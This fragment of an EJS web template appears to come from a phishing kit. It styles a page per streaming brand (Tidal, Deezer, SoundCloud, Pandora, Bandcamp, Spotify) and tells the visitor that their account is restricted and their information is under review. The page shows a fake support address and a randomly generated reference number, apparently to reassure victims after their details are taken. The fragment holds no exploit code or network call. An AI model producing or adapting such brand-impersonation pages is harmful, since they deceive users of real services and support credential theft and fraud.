body.brand-tidal{background:#000;color:#fff}body.brand-tidal .card{background:#111;border-radius:4px}
body.brand-deezer{background:#A238FF;color:#fff}body.brand-deezer .card{background:#fff;color:#1a1a1a;border-radius:8px}
body.brand-soundcloud{background:#FF5500;color:#fff}body.brand-soundcloud .card{background:#fff;color:#1a1a1a;border-radius:8px}
body.brand-pandora{background:#3668FF;color:#fff}body.brand-pandora .card{background:#fff;color:#1a1a1a;border-radius:8px}
body.brand-bandcamp{background:#1da0c3;color:#fff}body.brand-bandcamp .card{background:#fff;color:#1a1a1a;border-radius:8px}
body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .card{background:#181818;border-radius:8px}
</style>
</head>
<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="card">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
  <span class="lock-icon">🔒</span>
  <h1><%= pageContent.headline || 'Account Temporarily Restricted' %></h1>
  <p class="sub"><%= pageContent.subheadline || 'Your information is under review. Your account will be reactivated within 24-48 hours.' %></p>

  <div class="status-box">
    <div class="status-row">
      <span>Status</span>
      <span class="pending">Under Review ⏳</span>
    </div>
    <div class="status-row">
      <span>Estimated Review Time</span>
      <span class="val">24-48 hours</span>
    </div>
    <div class="status-row">
      <span>Contact</span>
      <span class="val">support@<%= tpl.name.toLowerCase().replace(/\s/g,'') %>.com</span>
    </div>
  </div>

  <p class="ref">Reference: REV-<%= Math.random().toString(36).substr(2,8).toUpperCase() %></p>
</div>
</body>
</html>
